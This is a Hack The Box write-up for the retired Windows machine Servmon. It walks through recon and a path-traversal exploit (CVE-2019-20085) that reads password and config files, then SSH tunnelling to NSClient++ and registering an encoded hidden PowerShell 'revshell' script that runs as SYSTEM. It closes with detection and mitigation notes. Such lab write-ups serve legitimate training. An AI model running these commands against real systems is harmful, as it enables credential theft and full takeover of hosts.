---
machine: Servmon
os: Windows
difficulty: Easy
platform: Hack The Box
category: Services / Windows
state: Retired
pwned: 2026-11-09
tags: [windows, nvms, nsclient, path-traversal, command-injection]
---

# Servmon — Hack The Box

**English** | [🇪🇸 Español](README.md)

## TL;DR

NVMS-1000 on port 80 is vulnerable to **path traversal** (CVE-2019-20085), leaking a file with passwords. Those credentials give SSH, and `nsclient.ini` grants web access to **NSClient++**. The panel only listens on localhost, so an SSH tunnel gets you there and an external script runs as `SYSTEM`.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 21,22,80,135,139,445,5666,6690,8443,49664 <TARGET_IP>
```

| Port | Service |
|---|---|
| 21/tcp | FTP |
| 22/tcp | OpenSSH |
| 80/tcp | NVMS-1000 |
| 445/tcp | SMB |
| 8443/tcp | NSClient++ (localhost only) |

## Foothold: path traversal

```bash
curl --path-as-is 'http://<TARGET_IP>/../../../../../../Users/Nadine/Desktop/Passwords.txt'
curl --path-as-is 'http://<TARGET_IP>/../../../../../../ProgramData/nsclient/nsclient.ini'
```

The first gives `Nadine`'s password; the second gives NSClient++'s (and `allowed hosts`, usually `127.0.0.1`).

```bash
ssh nadine@<TARGET_IP>
type C:\Users\Nadine\Desktop\user.txt
```

## Escalation: NSClient++

The port is bound to localhost, so tunnel it:

```bash
ssh -L 8443:127.0.0.1:8443 nadine@<TARGET_IP>
```

In the panel (`https://127.0.0.1:8443`, user `admin`), register an external script:

```ini
[/settings/external scripts/scripts]
revshell = cmd /c powershell -nop -w hidden -enc <BASE64>
```

Then trigger it over the API:

```bash
curl -k -u 'admin:<password>' 'https://127.0.0.1:8443/api/v1/queries/revshell/commands/execute?time=1m'
```

The process runs as `SYSTEM` because the NSClient++ service does.

## Typical errors

- **Traversal returns 404** → use `--path-as-is` and adjust the number of `../`; NVMS normalises paths.
- **SSH rejects the password** → `Nadine` may have another account; read the whole passwords file.
- **8443 does not answer** → it is bound to `127.0.0.1`; without a tunnel there is no access.
- **API returns 403** → `allowed hosts` does not include your IP; the SSH tunnel makes requests come from localhost.
- **Script does not appear** → reload the configuration (`/api/v1/settings/...`) or restart the service.

## Detection and mitigation

- NVMS-1000: patch (CVE-2019-20085) and keep it off the internet.
- NSClient++: strong password, explicit `allowed hosts`, no unnecessary external scripts.
- **4688** with `cmd.exe` as a child of `nsclient++.exe`; **4688** with `powershell -enc`.
- Audit SSH tunnels to admin ports and `curl --path-as-is` in logs.

MITRE: T1190, T1059.001, T1572.
